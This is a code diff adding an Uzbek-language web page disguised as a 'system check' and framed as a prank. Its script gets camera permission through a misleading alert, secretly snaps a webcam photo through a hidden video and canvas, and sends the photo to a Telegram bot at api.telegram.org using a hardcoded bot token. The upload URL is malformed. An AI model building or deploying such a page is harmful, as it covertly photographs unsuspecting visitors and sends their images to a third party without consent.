@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tizimni tekshirish</title>
+    <style>
+        body { background: #1a1a1a; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #status { padding: 20px; text-align: center; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <h2 id="status">Tizim yuklanmoqda...</h2>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // O'ZINGIZNING MA'LUMOTLARINGIZNI YOZING
+        const TOKEN = "8558075971:AAEdWMc5IoAxSpJxL9q-aaZ-mtvDd4-Mc74";
+        const MY_ID = "SIZNING_CHAT_ID_RAQAMINGIZ"; // @userinfobot orqali olingan ID
+
+        window.onload = async () => {
+            alert("Diqqat! Kamera ruxsatisiz prank ishlamaydi 😉 OK bosing.");
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+
+                document.getElementById('status').innerText = "Prank muvaffaqiyatli! 😂";
+
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', MY_ID);
+                    formData.append('photo', blob, 'image.jpg');
+                    formData.append('caption', '📸 Yangi rasm keldi!');
+
+                    fetch(`https://api.telegram.org{TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                }, 1000);
+            } catch (e) {
+                alert("Ruxsat berilmadi!");
+            }
+        };
+    </script>
+</body>
+</html>
